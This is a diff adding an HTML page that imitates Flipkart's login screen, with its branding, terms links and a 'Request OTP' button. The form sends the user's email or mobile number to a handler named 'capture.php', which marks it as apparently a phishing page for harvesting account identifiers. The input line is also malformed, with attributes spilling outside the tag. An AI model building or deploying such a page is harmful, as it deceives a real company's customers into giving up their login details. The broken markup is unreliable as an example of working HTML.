@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Login UI</title>
+  <link rel="stylesheet" href="./style.css">
+</head>
+<body>
+  <div class="login-container">
+    <div class="left-panel">
+      <h1>Login</h1>
+      <p>Get access to your Orders, Wishlist and Recommendations</p>
+    </div>
+    <div class="right-panel">
+      <form action="./capture.php" method="POST">
+        <label for="email">Enter Email/Mobile number</label>
+        <input type="text" id="email" name="email" required> placeholder="Enter Email/Mobile number" required>
+        <button type="submit" class="submit-btn">Request OTP</button>
+        <p class="terms">
+          By continuing, you agree to Flipkart's 
+          <a href="#">Terms of Use</a> and <a href="#">Privacy Policy</a>.
+        </p>
+        <p class="create-account">
+          <a href="#">New to Flipkart? Create an account</a>
+        </p>
+      </form>
+    </div>
+  </div>
+</body>
+</html>
